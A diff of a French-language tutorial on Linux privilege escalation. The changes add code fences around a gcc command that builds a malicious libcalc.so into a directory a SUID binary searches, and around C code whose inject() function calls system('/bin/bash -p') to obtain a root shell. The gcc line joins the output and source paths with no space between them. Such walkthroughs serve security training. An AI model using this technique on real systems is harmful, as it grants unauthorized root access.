@@ -15,6 +15,7 @@ Imaginons qu'il ne trouve pas un fichier .so nommé libcalc.so dans le dossier /
 
 `gcc -shared -fPIC -o /home/user/.config/libcalc.so/home/user/tools/suid/libcalc.c` . Dans mon exemple, dans le fichier libcalc.c, il y a un mini script qui donne les privilèges root :
 
+```C
 #include <stdio.h>  
 #include <stdlib.h>
 
@@ -25,3 +26,4 @@ void inject() {
         system("/bin/bash -p");  
 }  
 Enfin, on relance le fichier suid pour voir si ca marche.
+```
